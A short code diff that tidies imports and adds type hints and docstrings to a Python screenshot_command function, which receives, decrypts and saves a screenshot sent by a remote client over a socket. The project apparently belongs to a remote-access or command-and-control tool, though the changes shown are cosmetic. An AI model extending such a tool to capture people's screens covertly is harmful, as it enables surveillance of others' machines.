@@ -1,10 +1,20 @@
-from components.networking import reliable_recieve, process_and_check_recieved_data, clear_socket_buffer
-from components.ingestor import createfile_nocollision
+"""Screenshot capturing utilities."""
+
+import socket
 import time
-from components.logging import log_activity
 from termcolor import colored
 
-def screenshot_command(client_output, conn_obj):
+from components.networking import (
+    reliable_recieve,
+    process_and_check_recieved_data,
+    clear_socket_buffer,
+)
+from components.ingestor import createfile_nocollision
+from components.logging import log_activity
+
+def screenshot_command(client_output: bytes, conn_obj: 'socket.socket') -> str:
+    """Receive, decrypt and store a screenshot from the client."""
+
     random_image_filename = createfile_nocollision("screenshot_data", ".png")
     
     # Required variables
